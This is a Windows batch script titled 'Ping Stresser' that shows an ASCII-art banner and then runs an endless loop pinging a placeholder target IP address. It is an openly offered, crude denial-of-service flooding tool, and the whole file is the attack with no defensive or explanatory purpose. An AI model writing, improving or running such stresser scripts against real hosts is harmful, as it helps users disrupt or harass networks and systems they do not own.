@echo off
title Ping Stresser
color a
echo .
echo .___                   __                                             
echo |   |_____     _______/  |________   ____   ______ ______ ___________ 
echo |   \____ \   /  ___/\   __\_  __ \_/ __ \ /  ___//  ___// __ \_  __ \
echo |   |  |_> >  \___ \  |  |  |  | \/\  ___/ \___ \ \___ \\  ___/|  | \/
echo |___|   __/  /____  > |__|  |__|    \___  >____  >____  >\___  >__|   
echo     |__|          \/                    \/     \/     \/     \/     
echo .
:loop
ping (you target ip)
goto loop
